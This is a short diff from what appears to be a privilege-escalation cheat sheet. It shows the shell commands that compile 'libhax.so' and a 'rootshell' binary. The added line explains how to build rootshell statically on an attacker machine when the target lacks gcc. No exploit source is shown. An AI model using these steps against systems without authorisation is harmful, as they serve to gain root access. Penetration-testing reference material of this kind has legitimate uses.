@@ -3131,6 +3131,7 @@ root@Machine1:~# ls
 libhax.c  rootshell.c
 root@Machine1:~# gcc -fPIC -shared -ldl -o libhax.so libhax.c
 root@Machine1:~# gcc -o rootshell rootshell.c
+if gcc not installed, on the attacker machine : gcc -o rootshell rootshell.c -static -static-libgcc -static-libstdc++
 ````
 ##### Attack
 ````
